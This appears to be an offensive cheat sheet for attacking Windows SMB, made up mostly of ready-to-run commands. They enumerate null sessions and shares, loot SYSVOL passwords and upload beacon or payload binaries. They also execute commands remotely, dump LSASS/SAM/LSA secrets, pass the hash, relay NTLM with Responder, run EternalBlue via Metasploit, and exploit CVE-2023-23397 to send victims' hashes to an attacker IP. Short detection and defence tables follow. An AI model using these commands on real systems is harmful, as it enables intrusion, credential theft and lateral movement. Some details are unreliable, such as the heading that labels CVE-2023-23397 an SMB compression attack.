# SMB Attacks

Server Message Block (SMB) is the primary file sharing and remote administration protocol in Windows networks. It is a high-value attack surface for initial access, credential theft, and lateral movement.

## SMB Null Session Enumeration

Null sessions connect to SMB without credentials. Legacy Windows/Samba configurations permit anonymous access to IPC$ for enumeration.

### smbclient null session
```bash
# List shares via null session
smbclient -L //10.10.10.10 -N

# Connect to IPC$ null session
smbclient //10.10.10.10/IPC$ -N

# Once connected, use RPC commands
srvinfo
enumnetlogon
dsenum
```
smbclient null session output shows available shares, OS version, and domain info.

### enum4linux-ng (enhanced null session)
```bash
# Full null session enum
enum4linux-ng 10.10.10.10 -A

# Specific null session checks
enum4linux-ng 10.10.10.10 -U   # Users via RID cycling
enum4linux-ng 10.10.10.10 -S   # Share listing
enum4linux-ng 10.10.10.10 -P   # Password policy
enum4linux-ng 10.10.10.10 -O   # OS info
enum4linux-ng 10.10.10.10 -G   # Groups
```

### rpcclient null session
```bash
# Connect to IPC$ via SMB named pipe
rpcclient -U "" -N 10.10.10.10

# Enum commands once connected
srvinfo
enumdomusers
enumdomgroups
enumalsgroups builtin
lookupnames administrator
getdompwinfo
querydominfo
netshareenumall
netsharegetinfo C$
```
Null sessions are largely disabled on modern Windows (default since Windows 2003 SP1), but often found on legacy systems, Samba misconfigurations, or in non-Microsoft SMB implementations.

---

## SMB Signing Check

SMB signing cryptographically signs SMB packets. When signing is **disabled**, NTLM relay is possible. When **enabled and required**, relay is blocked.

### Why it matters
- **Signing disabled** — SMB relay, man-in-the-middle, credential forwarding
- **Signing enabled but not required** — Relay may still work (server accepts unsigned)
- **Signing enabled and required** — SMB relay prevented; must target LDAP or HTTP

### NetExec
```bash
# Check SMB signing (no creds needed)
nxc smb 10.10.10.10 -u '' -p ''
# Output: SMB signing:True/False

# Scan subnet for systems with signing disabled
nxc smb 10.10.10.0/24 -u '' -p '' | grep "signing:False"

# With credentials
nxc smb 10.10.10.10 -u user -p pass --signing-check
```

### Manual check
```bash
# Using smbclient
smbclient -L //10.10.10.10 -N
# If null session succeeds, signing is likely disabled

# Using enum4linux-ng
enum4linux-ng 10.10.10.10 -A 2>&1 | grep -i signing
```

### nmap SMB signing script
```bash
nmap --script smb-security-mode -p445 10.10.10.10
# Output shows message_signing: enabled/disabled
```

---

## SMB Named Pipe Abuse

SMB named pipes allow RPC communication over SMB. The IPC$ share exposes named pipes that enable remote administration and enumeration.

### rpcclient over SMB named pipes

```bash
# Connect to various RPC services via named pipes
# LSARPC (LSA policy)
rpcclient -U 'DOMAIN\user' 10.10.10.10
# or use ncacn_np:
rpcclient -U 'DOMAIN\user%pass' 10.10.10.10 -ncacn_np

# SAMR (Security Account Manager)
rpcclient -U 'DOMAIN\user%pass' 10.10.10.10
# Then:
enumdomusers
enumdomgroups
lookupnames administrator
createdomuser hacker   # (requires privileges)
samlookupnames
queryuser administrator
```

### Key named pipes and their services

| Named Pipe | Service | Purpose |
|------------|---------|---------|
| `\PIPE\lsarpc` | LSARPC | LSA policy, SID lookup |
| `\PIPE\samr` | SAMR | User/group management |
| `\PIPE\netlogon` | Netlogon | Netlogon protocol |
| `\PIPE\srvsvc` | Server Service | Share management |
| `\PIPE\svcctl` | Service Control | Service creation/control |
| `\PIPE\winreg` | Windows Registry | Remote registry |
| `\PIPE\wkssvc` | Workstation Service | Workstation management |
| `\PIPE\epmapper` | Endpoint Mapper | RPC endpoint resolution |
| `\PIPE\eventlog` | Event Log | Remote event log access |

### nxc named pipe scanning
```bash
# Enumerate available named pipes
nxc smb 10.10.10.10 -u user -p pass -M enum_pipes

# Spider for interesting files
nxc smb 10.10.10.10 -u user -p pass -M spider_plus --option 'PATTERN=txt,conf,config,ps1,xml'

# Access check for named pipes
nxc smb 10.10.10.10 -u user -p pass -M pipe_check
```

---

## SMB Share Enumeration

Standard SMB shares provide access to critical AD data.

### Key shares

| Share | Path | Purpose | Access |
|-------|------|---------|--------|
| `ADMIN$` | `C:\Windows` | Remote admin, file writes | Admin |
| `C$` | `C:\` | Root drive | Admin |
| `D$`, `E$` | Other drives | Data drives | Admin |
| `IPC$` | (null) | Named pipes | Any authenticated |
| `SYSVOL` | `\\domain\SYSVOL` | GPO scripts, templates | Domain users (read) |
| `NETLOGON` | `\\domain\NETLOGON` | Logon scripts | Domain users (read) |
| `PRINT$` | Printer drivers | Printer sharing | Varies |

### NetExec share enumeration
```bash
# List all shares
nxc smb 10.10.10.10 -u user -p pass --shares

# List shares with details
nxc smb 10.10.10.10 -u user -p pass --shares --verbose

# Map shares to drive (from Windows)
net use Z: \\10.10.10.10\SYSVOL /user:DOMAIN\user pass
```

### smbmap share enumeration
```bash
# List shares with permissions
smbmap -H 10.10.10.10 -u user -p pass

# Recursive listing of all shares
smbmap -H 10.10.10.10 -u user -p pass -R

# Only writable shares
smbmap -H 10.10.10.10 -u user -p pass | grep "WRITE"

# Specific share recursive
smbmap -H 10.10.10.10 -u user -p pass -r 'SYSVOL'
```

### SYSVOL goldmine
```bash
# List GPO files in SYSVOL
smbclient //dc01/SYSVOL -U 'DOMAIN\user%pass' -c 'ls domain.local/Policies'

# Download all GPO XML files (often contains passwords)
smbmap -H dc01 -u user -p pass -R -A '*.xml' -r 'SYSVOL'

# Search for cpassword (GPP passwords)
nxc smb dc01 -u user -p pass -M gpp_passwords

# Check groups.xml, scheduledtasks.xml, printers.xml
smbclient //dc01/SYSVOL -U 'DOMAIN\user%pass' -c 'cd domain.local\Policies\{GUID}\Machine\Preferences\Groups; get Groups.xml'
```

---

## SMB File Download/Upload

### smbclient
```bash
# Download file
smbclient //dc01/SYSVOL -U 'DOMAIN\user%pass'
smb: \> get domain.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml

# Upload file
smbclient //target/C$ -U 'DOMAIN\admin%pass'
smb: \> put beacon.exe Windows\Temp\beacon.exe

# Recursive download
smb: \> recurse ON
smb: \> mget *

# Recurse upload
smb: \> recurse ON
smb: \> mput *
```

### smbmap
```bash
# Download file
smbmap -H 10.10.10.10 -u user -p pass --download 'C$\Users\Administrator\NTUSER.DAT'

# Upload file
smbmap -H 10.10.10.10 -u user -p pass --upload /local/payload.exe 'C$\Temp\payload.exe'

# Download specific path
smbmap -H 10.10.10.10 -u user -p pass --download 'SYSVOL\domain.local\Policies\{GUID}\Groups.xml'
```

### impacket-smbclient
```bash
# Interactive SMB client
impacket-smbclient DOMAIN/user:pass@10.10.10.10

# Commands once connected
shares           # List shares
use C$           # Connect to share
ls               # List files
cd Windows\Temp  # Change directory
get file.txt     # Download file
put local.txt    # Upload file
rm file.txt      # Delete file

# Single command
impacket-smbclient DOMAIN/user:pass@10.10.10.10 -c "shares; use C$; ls"
```

### NetExec file operations
```bash
# Download file
nxc smb 10.10.10.10 -u user -p pass --get-file 'C$\path\file.txt' /local/dest/

# Upload file
nxc smb 10.10.10.10 -u user -p pass --put-file /local/source.exe 'C$\Temp\name.exe'

# Spider and search content
nxc smb 10.10.10.10 -u user -p pass -M spider_plus --option 'PATTERN=pdf,doc,xls,docx,xlsx'
```

---

## SMB to RCE (Summarized)

Full details in Lateral Movement section. Summary only:

### PsExec (impacket)
```bash
psexec.py DOMAIN/user:pass@10.10.10.10
# Writes binary to ADMIN$, creates service, executes
```
See `04_Lateral_Movement/04_PsExec.md`

### smbexec (impacket)
```bash
smbexec.py DOMAIN/user:pass@10.10.10.10
# Uses SVCCTL over SMB named pipes, creates service
```
See `04_Lateral_Movement/06_SMB_Exec.md`

### wmiexec (impacket)
```bash
wmiexec.py DOMAIN/user:pass@10.10.10.10
# WMI via DCOM - no service creation (stealthier)
```
See `04_Lateral_Movement/05_WMI_Exec.md`

### NetExec execution
```bash
# Auto-selects execution method
nxc smb 10.10.10.10 -u user -p pass -x whoami

# Explicit method
nxc smb 10.10.10.10 -u user -p pass --exec-method smbexec -x whoami
nxc smb 10.10.10.10 -u user -p pass --exec-method wmiexec -x whoami
nxc smb 10.10.10.10 -u user -p pass --exec-method psexec -x whoami

# PowerShell execution
nxc smb 10.10.10.10 -u user -p pass -X 'Get-Process'
```

---

## SMB Vulnerability Scanning

### MS17-010 (EternalBlue)
```bash
# nxc module
nxc smb 10.10.10.10 -u '' -p '' -M ms17-010

# nmap script
nmap --script smb-vuln-ms17-010 -p445 10.10.10.10

# Manual check using impacket
python3 -c "
from impacket.smbconnection import SMBConnection
conn = SMBConnection('*SMBSERVER', '10.10.10.10')
conn.login('', '')
# Check if OS is vulnerable (Windows 7/2008R2 and below)
print(conn.getServerOS())
"

# Exploitation (AutoBlue-MS17-010)
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd shellcode && python3 mysmb.py

# Metasploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.10.10.10
msf6 > run
```

### MS08-067 (NetAPI)
```bash
# nmap check
nmap --script smb-vuln-ms08-067 -p445 10.10.10.10

# Metasploit
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 > set RHOSTS 10.10.10.10
msf6 > run
```

### General SMB vulnerability scanning
```bash
# nxc vulnerability modules
nxc smb 10.10.10.10 -u user -p pass -M zerologon
nxc smb 10.10.10.10 -u user -p pass -M petitpotam
nxc smb 10.10.10.10 -u user -p pass -M nopac
nxc smb 10.10.10.10 -u user -p pass -M printnightmare

# nmap smb-vuln-* scripts
nmap --script smb-vuln-* -p445 10.10.10.10
```

---

## SMB Interception (Relay)

SMB relay intercepts NTLM authentication and forwards it to a target. Full coverage in `06_NTLM_Relay.md`.

```bash
# Check if signing is disabled (prerequisite)
nxc smb 10.10.10.10 -u '' -p '' | grep signing

# Start responder (do not start SMB server)
sudo responder -I eth0 -Av

# Relay to target
ntlmrelayx.py -t smb://10.10.10.10 -smb2support

# Relay with SOCKS
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

---

## SMB Tools Reference

### smbmap
```bash
# Full enumeration
smbmap -H target -u user -p pass -R -q

# File search
smbmap -H target -u user -p pass -R -A "password|secret|backup"

# Command execution
smbmap -H target -u user -p pass -x 'whoami'
```

### smbclient
```bash
# List shares
smbclient -L //target -N                  # Null session
smbclient -L //target -U 'user%pass'       # With creds

# Connect to share
smbclient //target/SYSVOL -U 'user%pass'
smbclient //target/C$ -U 'DOMAIN\admin%pass'
```

### impacket-smbclient
```bash
# Interactive shell
impacket-smbclient DOMAIN/user:pass@target

# Automated commands
impacket-smbclient DOMAIN/user:pass@target -c "shares; use C$; ls windows\\temp"
```

### nxc smb
```bash
# Basic enumeration
nxc smb 10.10.10.10 -u user -p pass
nxc smb 10.10.10.10 -u user -p pass --shares
nxc smb 10.10.10.10 -u user -p pass --users
nxc smb 10.10.10.10 -u user -p pass --groups
nxc smb 10.10.10.10 -u user -p pass --local-groups
nxc smb 10.10.10.10 -u user -p pass --pass-pol
nxc smb 10.10.10.10 -u user -p pass --sessions
nxc smb 10.10.10.10 -u user -p pass --disks

# Pass-the-hash
nxc smb 10.10.10.10 -u user -H NTLM_HASH

# Module execution
nxc smb 10.10.10.10 -u user -p pass -M enum_pipes
nxc smb 10.10.10.10 -u user -p pass -M spider_plus --option 'PATTERN=xml,conf'
nxc smb 10.10.10.10 -u user -p pass -M gpp_passwords
nxc smb 10.10.10.10 -u user -p pass -M lsassy
nxc smb 10.10.10.10 -u user -p pass -M sam
nxc smb 10.10.10.10 -u user -p pass -M lsa
```

---

## SMB over QUIC (SMB 3.1.1)

Windows Server 2022 and Windows 11 introduce SMB over QUIC (port 443/UDP) as an alternative to TCP/445. Encrypted with TLS 1.3 and runs over UDP.

### Characteristics
- Uses QUIC (HTTP/3) as transport — port 443/UDP
- Encrypted by default (TLS 1.3)
- Designed for cloud/edge scenarios (through firewalls)
- SMB 3.1.1 only
- Requires certificate on server
- Client must trust the server certificate

### Attack considerations
```bash
# SMB over QUIC requires:
# - Windows Server 2022 or Windows 11 client
# - Valid TLS certificate on server
# - Port 443/UDP open through firewall
# - Enabled on server: Set-SmbServerConfiguration -EnableSmbQuic $true

# Cannot be enumerated with traditional SMB scanning tools
# (they connect to TCP/445, not UDP/443)

# Detection: SMB over QUIC connections on UDP/443
# Traditional SMB tools won't see it
# Must use QUIC-aware client (Windows 11, Server 2022)
```

### Checking for SMB over QUIC
```bash
# From Windows 11/Server 2022
Get-SmbConnection | Where-Object { $_.ProtocolVersion -eq "3.1.1" }

# Network scan for QUIC
nmap -sU -p 443 10.10.10.10 --script quic* 2>/dev/null
```

---

## SMB Compression Attack (CVE-2023-23397)

CVE-2023-23397 is a pre-authentication vulnerability in Microsoft Outlook that forces the client to send NTLM authentication to an attacker-controlled SMB server.

### How it works
1. Attacker sends a specially crafted email with a malicious MAPI property pointing to `\\attacker\file`
2. Outlook automatically connects to the UNC path to load the reminder sound file
3. Windows sends the user's NTLM hash to the attacker's SMB server
4. Attacker captures the NTLMv2 hash

### Exploitation
```bash
# Step 1: Set up Responder or ntlmrelayx to capture
sudo responder -I eth0 -Av

# Step 2: Send malformed email with malicious appointment
# Using python script (CVE-2023-23397.py)
python3 CVE-2023-23397.py --target victim@domain.local \
  --sender attacker@domain.local \
  --server mail.domain.local \
  --attacker-ip 10.10.10.5 \
  --smtp-port 25

# Alternative: manual crafted .msg file with UNC path
# The appointment/meeting request contains:
# ReminderSoundFile: \\10.10.10.5\notmalicious\sound.wav
```

### Detection
```bash
# Look for Outlook connections to external SMB shares
# Event ID 5140 - SMB share access from OUTLOOK.EXE to external IP
# Event ID 4624 - NTLM authentication to attacker server
```

### Impact
- No user interaction (Outlook auto-preview in vulnerable versions)
- Pre-authentication (no creds needed)
- NTLM hash capture or relay
- Affects all Office versions (patched March 2023)
- If relay target has SMB signing disabled, can authenticate as victim

---

## Detection & Signatures

| Event ID | Source | Indication |
|----------|--------|------------|
| 5140 | Security | SMB share access (IPC$, ADMIN$) |
| 5145 | Security | SMB file access with details |
| 4624 | Security | Network logon (LogonType 3) |
| 4672 | Security | Admin logon (admin privs assigned) |
| 4697 | Security | Service creation (smbexec/psexec) |
| 4776 | Security | NTLM credential validation |
| 8004 | SMB Client | SMB over QUIC connections |
| 31017 | SMB Server | SMB compression negotiation |

**Network signatures:**
- NTLM authentication from unexpected source IPs
- Multiple SMB session setups from single IP
- SMB connection to IPC$ followed by named pipe access
- Automated share enumeration across subnet
- SMB connections to external IPs from OUTLOOK.EXE (CVE-2023-23397)
- SMB traffic on UDP/443 (QUIC)

## Defenses

| Control | Detail |
|---------|--------|
| Disable SMB1 | Remove legacy protocol entirely |
| Enable SMB signing | GPO: `Microsoft network server: Digitally sign communications (always)` |
| Disable null sessions | Restrict anonymous access via RestrictAnonymous |
| Block outbound SMB | Block TCP/445 and UDP/445 at network perimeter |
| Firewall rules | Restrict SMB to management subnets only |
| Patch management | Apply MS17-010, MS08-067, CVE-2023-23397 patches |
| SMB hardening | Disable SMB compression if not needed |
| Network segmentation | Isolate workstation SMB from server SMB |
| Monitor | Alert on SMB access to IPC$, ADMIN$ from unknown machines |
| QUIC control | Block UDP/443 for SMB QUIC if not needed |

## Common Pitfalls

| Issue | Fix |
|-------|-----|
| Null session fails | Modern Windows blocks it; try with creds |
| SMB relay fails | SMB signing enabled; relay to LDAP/HTTP instead |
| MS17-010 fails | Target is patched or not Windows 7/2008R2 |
| Can't write to ADMIN$ | Not local admin; need privilege escalation |
| SMB over QUIC not visible | Different port/protocol; scan UDP/443 |
| Share enumeration empty | No permissions; use creds with more privileges |

## References

- Impacket: https://github.com/fortra/impacket
- NetExec: https://github.com/Pennyw0rth/NetExec
- smbmap: https://github.com/ShawnDEvans/smbmap
- SMB over QUIC: https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-over-quic
- CVE-2023-23397: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23397
- MS17-010: https://msrc.microsoft.com/update-guide/en-US/advisory/MS17-010
- SMB signing: https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-server-digitally-sign-communications-always
